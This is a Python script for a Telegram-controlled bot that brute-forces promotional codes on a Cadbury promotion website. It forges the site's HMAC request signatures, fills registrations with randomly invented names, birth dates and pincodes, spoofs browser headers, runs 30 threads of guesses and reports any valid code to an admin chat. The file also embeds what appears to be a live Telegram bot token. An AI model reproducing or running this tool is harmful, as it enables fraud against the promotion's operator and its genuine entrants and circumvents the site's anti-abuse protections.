import requests
import json
import base64
import hmac
import hashlib
import random
import string
import time
import urllib.parse
import threading
import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "8646908060:AAGzfWQcu6vDIXKbZTgYuJ-e0ueIHcAOqN8"
ADMIN_IDS = [1446058092]  # Your admin ID

BASE_URL = "https://cadburybakespromo.com"
MAX_WORKERS = 30
TIMEOUT = 20

VALID_FILE = "valid_codes.txt"
found_valid = False
valid_code = None
stats_lock = threading.Lock()
user_mobile = None
user_data = None
user_key = None
data_key = None
brute_force_running = False
brute_force_thread = None
chat_id = None

# Patterns
PATTERNS = [
    "LLLDLLLDLL",
    "LLLLLLLLDL",
    "LLLLLLLLLL"
]

# ========== LOGGING ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== TELEGRAM FUNCTIONS ==========
def send_telegram_message(chat_id, message, parse_mode="Markdown"):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        response = requests.post(url, json=payload, timeout=30)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Telegram send error: {e}")
        return False

def send_telegram_document(chat_id, file_path, caption=""):
    """Send a file to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.status_code == 200
    except Exception as e:
        logger.error(f"Document send error: {e}")
        return False

# ========== CORE FUNCTIONS ==========
def generate_code():
    pattern = random.choice(PATTERNS)
    code = []
    for ch in pattern:
        if ch == 'L':
            code.append(random.choice(string.ascii_uppercase))
        elif ch == 'D':
            code.append(random.choice(string.digits))
    return ''.join(code)

def generate_master_key():
    return str(random.randint(1000000000, 9999999999))

def generate_user_data(mobile):
    first_names = ["Raj","Amit","Priya","Vikram","Sneha","Rahul","Anita","Deepak","Neha","Sanjay"]
    last_names = ["Singh","Kumar","Sharma","Patel","Verma","Reddy","Gupta","Joshi","Rao","Malhotra"]
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    year = random.randint(1960, 2005)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    age = f"{year:04d}-{month:02d}-{day:02d}"
    pincode = str(random.randint(100000, 999999))
    return {"name": name, "age": age, "pincode": pincode, "mobile": mobile}

def create_session():
    master_key = generate_master_key()
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    }
    cookies = {'casdbury-blockbuster-id': master_key}
    payload = {"masterKey": master_key}
    try:
        resp = requests.post(f"{BASE_URL}/api/users", json=payload, headers=headers, cookies=cookies, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            if "resp" in data:
                decoded_str = base64.b64decode(data["resp"]).decode()
                decoded = json.loads(decoded_str)
                if decoded.get("statusCode") == 200:
                    return decoded.get("userKey"), decoded.get("dataKey")
    except Exception as e:
        logger.error(f"Session creation error: {e}")
    return None, None

def generate_signature(payload, user_key, data_key):
    payload_str = json.dumps(payload, separators=(",", ":"))
    part_a = base64.b64encode(payload_str.encode()).decode()
    ts = str(payload["t"])
    part_u = base64.b64encode(ts.encode()).decode()
    hmac_key = data_key[4:18].encode()
    string_to_sign = f"{part_u}.{part_a}"
    hmac_obj = hmac.new(hmac_key, string_to_sign.encode(), hashlib.sha256)
    hmac_result = hmac_obj.hexdigest()
    part_f = base64.b64encode(hmac_result.encode()).decode()
    m = random.randint(1, 6)
    k = random.randint(2, 8)
    h_rand = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(k))
    signature = f"{k}{m}{part_f[0:m]}{h_rand}{part_f[m:]}"
    data_field = f"{urllib.parse.quote_plus(part_u)}.{urllib.parse.quote_plus(part_a)}.{urllib.parse.quote_plus(signature)}"
    return data_field

def register_code(user_key, data_key, code, user_data):
    timestamp = int(time.time() * 1000)
    payload = {
        "code": code,
        "name": user_data["name"],
        "mobile": user_data["mobile"],
        "age": user_data["age"],
        "pincode": user_data["pincode"],
        "agree1": True,
        "promotionalConsent": True,
        "userKey": user_key,
        "t": timestamp
    }
    data_field = generate_signature(payload, user_key, data_key)
    body = f"userKey={user_key}&data={data_field}"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    }
    url = f"{BASE_URL}/api/users/register/{user_key}"
    try:
        resp = requests.post(url, params={"t": timestamp}, data=body, headers=headers, timeout=TIMEOUT)
        try:
            resp_data = resp.json()
            if "resp" in resp_data:
                decoded_str = base64.b64decode(resp_data["resp"]).decode()
                decoded = json.loads(decoded_str)
                decoded["http_status"] = resp.status_code
                return decoded
            return {"statusCode": resp.status_code, "http_status": resp.status_code, "raw": resp_data}
        except:
            return {"statusCode": resp.status_code, "http_status": resp.status_code}
    except Exception as e:
        return {"statusCode": 0, "http_status": 0, "message": str(e)}

def worker(thread_id, chat_id):
    global found_valid, valid_code, user_key, data_key, user_data, user_mobile
    
    attempts = 0
    start_time = time.time()
    last_update = 0
    
    while not found_valid and brute_force_running:
        code = generate_code()
        attempts += 1
        response = register_code(user_key, data_key, code, user_data)
        status = response.get("statusCode", 0)
        http_status = response.get("http_status", 0)

        # Send status update every 1000 attempts
        if attempts % 1000 == 0 and attempts != last_update:
            last_update = attempts
            elapsed = int(time.time() - start_time)
            send_telegram_message(
                chat_id,
                f"🔄 *Progress Update*\n\n"
                f"🧵 Thread: {thread_id}\n"
                f"🔄 Attempts: {attempts}\n"
                f"⏱️ Time: {elapsed}s\n"
                f"🔍 Still searching...",
                parse_mode="Markdown"
            )

        if status == 200 or http_status == 200:
            found_valid = True
            valid_code = code
            
            elapsed = int(time.time() - start_time)
            message = (
                f"🎉 *VALID CODE FOUND!* 🎉\n\n"
                f"🔑 *Code:* `{code}`\n"
                f"📱 *Mobile:* {user_data['mobile']}\n"
                f"👤 *Name:* {user_data['name']}\n"
                f"📅 *DOB:* {user_data['age']}\n"
                f"📍 *Pincode:* {user_data['pincode']}\n"
                f"🔄 *Attempts:* {attempts}\n"
                f"⏱️ *Time taken:* {elapsed}s\n"
                f"🧵 *Thread:* {thread_id}\n\n"
                f"💾 Saved to: `{VALID_FILE}`"
            )
            
            logger.info(f"🎉 VALID CODE FOUND: {code}")
            
            # Send to Telegram
            send_telegram_message(chat_id, message)
            
            # Save and send file
            with open(VALID_FILE, "a") as f:
                f.write(f"{code} | {user_data['mobile']} | {user_data['name']}\n")
            
            send_telegram_document(chat_id, VALID_FILE, f"✅ Valid code found: {code}")
            break

        time.sleep(random.uniform(0.02, 0.08))

def start_brute_force(chat_id, mobile):
    global found_valid, valid_code, user_key, data_key, user_data, user_mobile, brute_force_running
    
    found_valid = False
    valid_code = None
    brute_force_running = True
    user_mobile = mobile
    user_data = generate_user_data(mobile)
    
    # Send start message
    send_telegram_message(
        chat_id,
        f"🚀 *Brute Force Started!*\n\n"
        f"📱 Mobile: `{mobile}`\n"
        f"👤 Name: {user_data['name']}\n"
        f"🧵 Threads: {MAX_WORKERS}\n"
        f"🔍 Looking for valid code...\n\n"
        f"⏳ This may take some time. You'll be notified when found!",
        parse_mode="Markdown"
    )
    
    # Create session
    user_key, data_key = create_session()
    if not user_key or not data_key:
        send_telegram_message(chat_id, "❌ *Session creation failed!*", parse_mode="Markdown")
        brute_force_running = False
        return
    
    logger.info(f"Session created: userKey={user_key}")
    
    # Start workers
    threads = []
    for i in range(MAX_WORKERS):
        t = threading.Thread(target=worker, args=(i+1, chat_id))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for completion
    while not found_valid and brute_force_running:
        time.sleep(1)
    
    brute_force_running = False
    
    if valid_code:
        send_telegram_message(
            chat_id,
            f"✅ *Done!* Valid code: `{valid_code}`\n\n"
            f"📱 Mobile: `{mobile}`\n"
            f"📁 File: `{VALID_FILE}`",
            parse_mode="Markdown"
        )
    else:
        send_telegram_message(chat_id, "❌ *Brute force stopped.*", parse_mode="Markdown")

# ========== TELEGRAM BOT HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    
    # Check if admin
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    global chat_id
    chat_id = update.effective_chat.id
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Brute Force", callback_data="start_brute")],
        [InlineKeyboardButton("⏹ Stop Brute Force", callback_data="stop_brute")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status_text = "❌ Not running" if not brute_force_running else "✅ Running"
    mobile_text = user_mobile or "Not set"
    
    await update.message.reply_text(
        f"🤖 *Cadbury Brute Force Bot*\n\n"
        f"📱 Mobile: `{mobile_text}`\n"
        f"📊 Status: {status_text}\n"
        f"🧵 Threads: {MAX_WORKERS}\n\n"
        f"Use the buttons below to control the bot:",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    global brute_force_running
    brute_force_running = False
    await update.message.reply_text("⏹ *Brute force stopped!*", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    global chat_id, user_mobile
    chat_id = update.effective_chat.id
    
    text = update.message.text.strip()
    
    # If user sends a mobile number, start brute force
    if text.isdigit() and len(text) == 10:
        if brute_force_running:
            await update.message.reply_text("⚠️ Brute force is already running! Use /stop first.")
            return
        
        user_mobile = text
        await update.message.reply_text(
            f"📱 Mobile number set to: `{text}`\n\n"
            f"🚀 Starting brute force...",
            parse_mode="Markdown"
        )
        
        # Start brute force in background thread
        thread = threading.Thread(target=start_brute_force, args=(chat_id, text))
        thread.daemon = True
        thread.start()
    else:
        await update.message.reply_text(
            "📱 Please send a valid 10-digit mobile number to start brute force.\n\n"
            "Example: `9876543210`",
            parse_mode="Markdown"
        )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("⛔ Unauthorized.")
        return
    
    global chat_id, brute_force_running
    chat_id = update.effective_chat.id
    
    if query.data == "start_brute":
        if brute_force_running:
            await query.edit_message_text("⚠️ Brute force is already running!")
            return
        
        if not user_mobile:
            await query.edit_message_text(
                "📱 Please send your 10-digit mobile number first.\n\n"
                "Example: `9876543210`",
                parse_mode="Markdown"
            )
            return
        
        await query.edit_message_text(
            f"🚀 Starting brute force for: `{user_mobile}`\n\n"
            f"⏳ Please wait...",
            parse_mode="Markdown"
        )
        
        thread = threading.Thread(target=start_brute_force, args=(chat_id, user_mobile))
        thread.daemon = True
        thread.start()
    
    elif query.data == "stop_brute":
        brute_force_running = False
        await query.edit_message_text("⏹ *Brute force stopped!*", parse_mode="Markdown")
    
    elif query.data == "status":
        status = "✅ Running" if brute_force_running else "❌ Not running"
        await query.edit_message_text(
            f"📊 *Status*\n\n"
            f"📱 Mobile: `{user_mobile or 'Not set'}`\n"
            f"📊 Status: {status}\n"
            f"🧵 Threads: {MAX_WORKERS}\n"
            f"🔑 Valid Code: `{valid_code or 'Not found yet'}`",
            parse_mode="Markdown"
        )

# ========== MAIN ==========
def main():
    """Start the bot"""
    print("="*60)
    print("🔥 CADBURY BRUTE FORCE BOT (TELEGRAM CONTROLLED)")
    print("="*60)
    print(f"🤖 Bot Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"👑 Admin ID: {ADMIN_IDS[0]}")
    print(f"🧵 Threads: {MAX_WORKERS}")
    print("="*60)
    print("✅ Bot is running! Send /start on Telegram to begin.")
    print("="*60)
    
    # Create application
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    # Start polling
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
